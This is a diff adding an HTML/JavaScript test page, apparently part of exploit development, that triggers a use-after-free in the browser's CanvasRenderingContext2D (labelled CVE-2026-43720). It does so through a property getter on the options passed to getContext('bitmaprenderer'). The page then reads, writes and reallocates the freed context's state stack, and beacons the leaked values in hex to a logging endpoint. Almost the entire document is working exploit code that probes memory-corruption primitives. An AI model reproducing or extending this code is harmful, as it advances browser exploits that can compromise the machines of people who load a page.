@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V683 bare state</title></head>
+<body><pre id="out">V683 — freed inline state stack (read / write / grow / control)</pre>
+<script>
+/* V683: prove what survives in the freed 768-byte
+ * CanvasRenderingContext2D after the CVE-2026-43720 trigger, using the
+ * *inline* state stack (no save()s), i.e. before the stack is moved to a
+ * heap buffer whose pointer the destructor nulls.
+ *
+ *   v=0  -> m_stateStack = { m_buffer = this+128, m_capacity = 1, m_size = 1 }
+ *           ~Vector does NOT reset m_size/m_buffer, and the inline-capacity
+ *           deallocateBuffer() early-returns for the inline pointer, so all
+ *           three fields survive the free.
+ *   v>=1 -> stack moves out of line; ~VectorBuffer sets m_buffer = null,
+ *           so any read through state() faults (negative control).
+ *
+ * Modes (one per page load):
+ *   op=bare     read lineWidth only            (pure load, no alloc)
+ *   op=baref    read 5 doubles + transform + lineDash
+ *   op=barew    write lineWidth, read it back
+ *   op=baregrow save() then setter (realizeSaves -> allocateBuffer)
+ *   op=barerec  16 tagged 2d contexts, read lineWidth (same-type control)
+ *
+ * A synchronous OPRE beacon is sent BEFORE the trigger (chunk still live),
+ * so "OPRE without OSTEP" == the process died at the stale read.
+ * Progress/once is stored BEFORE the risky read; a crash reload shows
+ * BLOCKED and cannot loop.
+ *
+ * Params: op, v (save count, default 0), n (tagged ctx count, default 16),
+ *         once=1, reset=1
+ */
+'use strict';
+var PARAM = {};
+try {
+  var qs = location.search.replace(/^\?/, '');
+  var parts = qs.split('&');
+  for (var qi = 0; qi < parts.length; qi++) {
+    if (!parts[qi]) continue;
+    var kv = parts[qi].split('=');
+    PARAM[kv[0]] = decodeURIComponent(kv[1] || '');
+  }
+} catch (e) {}
+
+var MODE = PARAM.op || 'bare';
+var VS = parseInt(PARAM.v || '0', 10);
+if (!(VS >= 0)) VS = 0;
+if (VS > 64) VS = 64;
+var CTXN = parseInt(PARAM.n || '16', 10) || 16;
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+
+function st() {
+  try { if (window.localStorage) return window.localStorage; } catch (e) {}
+  try { if (window.sessionStorage) return window.sessionStorage; } catch (e) {}
+  return null;
+}
+var ST = st();
+function stGet(k) { try { return ST ? ST.getItem(k) : null; } catch (e) { return null; } }
+function stSet(k, v) { try { if (ST) ST.setItem(k, v); } catch (e) {} }
+function stDel(k) { try { if (ST) ST.removeItem(k); } catch (e) {} }
+
+function bk(tag, body) {
+  var u = '/beacon/V683-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now();
+  try { new Image().src = u; } catch (e) {}
+}
+/* synchronous: the log entry exists before the next line runs */
+function bks(tag, body) {
+  var u = '/beacon/V683-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); } catch (e) {}
+}
+
+var f64 = new Float64Array(1), u32 = new Uint32Array(f64.buffer);
+function d2hex(d) {
+  if (typeof d !== 'number') return String(d);
+  f64[0] = d;
+  return '0x' + ('00000000' + u32[1].toString(16)).slice(-8) + ('00000000' + u32[0].toString(16)).slice(-8);
+}
+
+function clearOnce() {
+  var n = 0;
+  try {
+    var keys = [];
+    for (var k = 0; k < ST.length; k++) keys.push(ST.key(k));
+    for (var j = 0; j < keys.length; j++) {
+      if (keys[j] && keys[j].indexOf('v683c_') === 0) { ST.removeItem(keys[j]); n++; }
+    }
+  } catch (e) {}
+  return n;
+}
+
+if (MODE === 'reset' || PARAM.reset === '1') {
+  var cn = clearOnce();
+  bks('ORESET', 'cleared=1,once=' + cn);
+  say('v683 guards cleared. Reload the index.');
+}
+if (MODE !== 'reset') {
+  var onceKey = 'v683c_' + MODE + '_v' + VS + '_n' + CTXN;
+  var once = PARAM.once === '1';
+  var blocked = false;
+  if (once) {
+    if (stGet(onceKey) === '1') blocked = true;
+    else stSet(onceKey, '1');   /* advance BEFORE the risky read */
+  }
+
+  if (blocked) {
+    bks('OBLOCK', 'op=' + MODE + ',v=' + VS);
+    say('BLOCKED by once=1 for op=' + MODE + ' v=' + VS + ' (tap RESET)');
+  } else {
+    var lateFired = false;
+    setTimeout(function () {
+      lateFired = true;
+      bk('OLATE', 'op=' + MODE + ',v=' + VS + ',alive=1');
+    }, 1500);
+
+    bks('OBOOT', 'op=' + MODE + ',v=' + VS + ',n=' + CTXN + ',once=' + (once ? 1 : 0));
+
+    var canvas = document.createElement('canvas');
+    canvas.width = 1; canvas.height = 1;
+    document.body.appendChild(canvas);
+    window._v683canvas = canvas;
+
+    var savedCtx = null;
+    var dict = {};
+    Object.defineProperty(dict, 'alpha', {
+      get: function () {
+        var ctx = canvas.getContext('2d');
+        if (!ctx) return true;
+        savedCtx = ctx;
+        window._v683ctx = ctx;      /* keep the wrapper alive */
+        try {
+          /* fixed marker values; for v>0 the final lineWidth=1.0 lands in
+           * the top state so a successful read is unambiguous either way */
+          ctx.lineWidth = 3.14159;
+          ctx.miterLimit = 7.77;
+          ctx.globalAlpha = 0.42;
+          ctx.lineDashOffset = 2.222;
+          ctx.shadowBlur = 5.55;
+          for (var s = 0; s < VS; s++) ctx.save();
+          if (VS > 0) ctx.lineWidth = 1.0;
+        } catch (eI) {}
+        return true;
+      }
+    });
+
+    /* beacon while the context is still ALIVE (allocations here cannot
+     * reclaim anything, the free has not happened yet) */
+    bks('OPRE', 'op=' + MODE + ',v=' + VS);
+
+    var bmpCtx = null, terr = '';
+    try { bmpCtx = canvas.getContext('bitmaprenderer', dict); }
+    catch (eJ) { terr = eJ.name || 'err'; }
+
+    if (!savedCtx) {
+      bks('OFAIL', 'op=' + MODE + ',no-inner');
+      say('ABORT: inner context missing');
+    } else if (!bmpCtx) {
+      bks('OFAIL', 'op=' + MODE + ',no-bmr:' + terr);
+      say('ABORT: bitmaprenderer failed ' + terr);
+    } else if (MODE === 'bare') {
+      /* single pure load: lineWidth() == state().lineWidth, no allocation */
+      var lw = null, le = '';
+      try { lw = savedCtx.lineWidth; } catch (eN) { le = eN.name || 'err'; }
+      bks('OSTEP', 'op=bare,v=' + VS + ',lw=' + (le ? 'ERR' : d2hex(lw)) +
+          (le ? '!' + le : ''));
+      say('v=' + VS + ' lw=' + (le ? 'THROW ' + le : d2hex(lw)));
+
+    } else if (MODE === 'baref') {
+      /* five pure double loads, then the two allocating getters last */
+      var r = [], nm = ['lw', 'ml', 'ga', 'ldo', 'sb'], g, ge;
+      var fns = [
+        function () { return savedCtx.lineWidth; },
+        function () { return savedCtx.miterLimit; },
+        function () { return savedCtx.globalAlpha; },
+        function () { return savedCtx.lineDashOffset; },
+        function () { return savedCtx.shadowBlur; }
+      ];
+      for (g = 0; g < 5; g++) {
+        ge = '';
+        try { r.push(nm[g] + '=' + d2hex(fns[g]())); }
+        catch (eO) { ge = eO.name || 'err'; r.push(nm[g] + '!' + ge); }
+      }
+      try {
+        var mt = savedCtx.getTransform();
+        r.push('m=' + [mt.a, mt.b, mt.c, mt.d, mt.e, mt.f].map(d2hex).join('|'));
+      } catch (eP) { r.push('m!' + (eP.name || 'err')); }
+      try {
+        var ld = savedCtx.getLineDash();
+        var lds = [];
+        for (var li = 0; li < ld.length && li < 8; li++) lds.push(d2hex(ld[li]));
+        r.push('ld=' + lds.join('|'));
+      } catch (eQ) { r.push('ld!' + (eQ.name || 'err')); }
+      bks('OSTEP', 'op=baref,v=' + VS + ',' + r.join(','));
+      say('v=' + VS + ' ' + r.join(' '));
+
+    } else if (MODE === 'barew') {
+      var wv = null, we = '';
+      try {
+        savedCtx.lineWidth = 123.456;
+        wv = savedCtx.lineWidth;
+      } catch (eR) { we = eR.name || 'err'; }
+      bks('OSTEP', 'op=barew,v=' + VS + ',w=' + (we ? 'ERR' : d2hex(wv)) +
+          (we ? '!' + we : ''));
+      say('v=' + VS + ' write 123.456 -> ' + (we ? 'THROW ' + we : d2hex(wv)));
+
+    } else if (MODE === 'baregrow') {
+      var gv = null, ge2 = '';
+      try {
+        savedCtx.save();               /* unrealized counter only */
+        savedCtx.lineWidth = 5.5;      /* realizeSaves -> vector grows */
+        gv = savedCtx.lineWidth;
+      } catch (eS) { ge2 = eS.name || 'err'; }
+      bks('OSTEP', 'op=baregrow,v=' + VS + ',w=' + (ge2 ? 'ERR' : d2hex(gv)) +
+          (ge2 ? '!' + ge2 : ''));
+      say('v=' + VS + ' save+write -> ' + (ge2 ? 'THROW ' + ge2 : d2hex(gv)));
+
+    } else if (MODE === 'barerec') {
+      /* control: if a tagged context wins the slot, the read is a miss */
+      var ckeep = new Array(CTXN), cmade = 0;
+      for (var c = 0; c < CTXN; c++) {
+        var cc = document.createElement('canvas');
+        cc.width = 1; cc.height = 1;
+        var cx = null;
+        try { cx = cc.getContext('2d'); } catch (eT) {}
+        if (cx) {
+          try { cx.lineWidth = 200 + cmade; } catch (eU) {}
+          ckeep[cmade] = cc;
+          cmade++;
+        }
+      }
+      window._v683keep = ckeep;
+      var lw2 = null, le2 = '';
+      try { lw2 = savedCtx.lineWidth; } catch (eV) { le2 = eV.name || 'err'; }
+      bks('OSTEP', 'op=barerec,v=' + VS + ',made=' + cmade +
+          ',lw=' + (le2 ? 'ERR' : d2hex(lw2)) + (le2 ? '!' + le2 : ''));
+      say('v=' + VS + ' made=' + cmade + ' lw=' + (le2 ? 'THROW ' + le2 : d2hex(lw2)));
+
+    } else {
+      bks('OFAIL', 'unknown-op=' + MODE);
+      say('unknown op ' + MODE);
+    }
+  }
+}
+</script>
+</body></html>
